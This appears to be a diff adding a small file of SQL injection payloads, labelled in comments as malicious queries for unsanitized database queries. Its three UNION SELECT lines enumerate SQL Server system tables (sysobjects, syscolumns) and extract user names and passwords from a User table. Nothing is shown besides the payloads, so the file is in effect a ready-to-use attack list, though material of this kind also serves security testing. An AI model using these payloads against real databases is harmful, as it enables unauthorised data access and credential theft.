@@ -1,0 +1,9 @@
+
+// Malicious queries for unsanitized database queries
+// Examples of SQL Injection
+
+' UNION SELECT name + ' ' + type + ' ' + convert(varchar(100),id) FROM sysobjects;--
+
+' UNION SELECT name FROM syscolumns WHERE id = 1125579048;--
+
+' UNION SELECT UserName + ' ' + Password FROM [User];--
